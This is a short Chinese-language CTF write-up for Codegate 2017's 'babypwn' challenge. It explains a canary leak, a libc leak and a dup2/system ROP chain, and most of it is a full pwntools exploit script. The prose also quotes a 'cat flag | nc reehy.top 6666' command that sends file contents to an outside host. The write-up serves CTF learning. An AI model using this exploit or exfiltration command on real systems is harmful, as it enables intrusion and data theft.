---
title: 2017codgate pwn
tags:
  - PWN
  - writeup
categories: []
date: 2017-02-17 18:55:14
---

话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz

## babypwn

简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道`dup2`可以就好了，其他的接着在研究。。

程序没有在字符串后补`\00`,先覆盖`canary`的`\00`位泄露`canary`，然后泄露`libcbase`，然后`dup2`+`system`构成`ropchain`。

看了别人的wp，发现还有别的方法，由于程序里调用了`system`，可以先将用`recv`命令`cat flag | nc reehy.top 6666`写到内存中比如`.data`，然后用`system(.data)`即可。

exp

```
from pwn import *

DEBUG = 1


elf = ELF('./babypwn')
system = 0x8048620
system = elf.symbols['system']
send = elf.symbols['send']
system_got = elf.got['system']
send_got = elf.got['send']
start_main_got = elf.got['__libc_start_main']
exit_got = elf.got['exit']
recv_got = elf.got['recv']
main = 0x08048A71
ret = 0x08048572
choose = 0x080488B1
ppr = 0x08048b84

if DEBUG:
    context.log_level = 'debug'
    libc = ELF('libc.so.6')
    p = remote('127.0.0.1', 8181)
else:
    libc = ELF('libc-2.19_16.so')
    p = remote('110.10.212.130', 8889)

def canary():
    p.recvuntil('menu >')
    p.sendline('1')
    p.recvuntil('Message :')
    payload = 'a' * 40
    p.sendline(payload)
    p.recvline()
    a = p.recvline()
    canary = u32('\x00' + a[0:3])
    return canary

def leak40(addr):
    p.recvuntil('menu >')
    p.sendline('1')
    p.recvuntil('Message :')
    offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0)
    payload = offset + p32(send) + p32(main)
    payload += p32(4) + p32(addr) + p32(4) + p32(0)
    p.sendline(payload)
    p.recvuntil('menu >')
    p.sendline('3')
    p.recv(1)
    leak = u32(p.recv(4))
    return leak

def dofomat():
    p.recvuntil('menu >')
    p.sendline('1')
    p.recvuntil('Message :')
    offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0)
    payload = offset
    payload += p32(dup2) + p32(ppr) + p32(4) + p32(0)  # failed!
    payload += p32(dup2) + p32(ppr) + p32(4) + p32(1)
    payload += p32(system) + p32(0) +p32(binsh)
    p.sendline(payload)
    p.recvuntil('menu >')
    p.sendline('3')

if __name__ == '__main__':
    canary = canary()
    leak = leak40(send_got)
    dup2 = libc.symbols['dup2'] - libc.symbols['send'] + leak
    binsh = libc.search('/bin/sh').next() - libc.symbols['send'] + leak
    dofomat()
    p.interactive()
    p.close()
```